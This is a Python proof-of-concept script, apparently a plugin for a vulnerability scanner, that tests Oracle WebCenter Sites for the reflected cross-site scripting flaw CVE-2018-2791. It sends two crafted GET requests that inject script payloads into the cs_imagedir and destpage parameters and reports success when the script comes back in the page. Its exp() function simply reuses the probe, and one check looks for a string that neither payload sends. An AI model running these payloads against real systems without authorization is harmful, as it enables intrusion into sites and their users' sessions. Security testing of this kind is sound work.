import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Oracle WebCenter Sites Multiple XSS''',
        "description": '''Vulnerability in the Oracle WebCenter Sites component of Oracle Fusion Middleware.''',
        "severity": "high",
        "references": [
            "http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html", 
            "http://www.securitytracker.com/id/1040695", 
            "http://www.securityfocus.com/bid/103800", 
            "https://www.exploit-db.com/exploits/44752/", 
            "https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2018-2791",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2018", "oracle", "xss", "wcs"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""<script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif""" in resp1.text) or ("""<script>alert(24)</script>""" in resp1.text and """Missing translation key""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url